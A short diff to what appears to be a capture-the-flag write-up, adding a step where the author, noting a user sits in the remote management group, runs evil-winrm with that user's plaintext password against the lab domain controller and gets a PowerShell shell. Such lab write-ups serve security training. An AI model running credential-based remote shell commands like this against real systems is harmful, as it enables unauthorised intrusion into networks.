@@ -418,3 +418,17 @@ objectSid: S-1-5-21-515537669-4223687196-3249690583-1110
 sAMAccountName: Help Desk
 ```
 
+This user is in remote management which means i can winrm
+
+# WINRM access as `sara.b`
+
+```python
+❯❯❯ evil-winrm -i dc01.certificate.htb -u sara.b -p 'Blink182' 
+                                        
+Evil-WinRM shell v4.1
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Info: Connection successful
+*Evil-WinRM* PS C:\Users\Sara.B\Documents>
+```
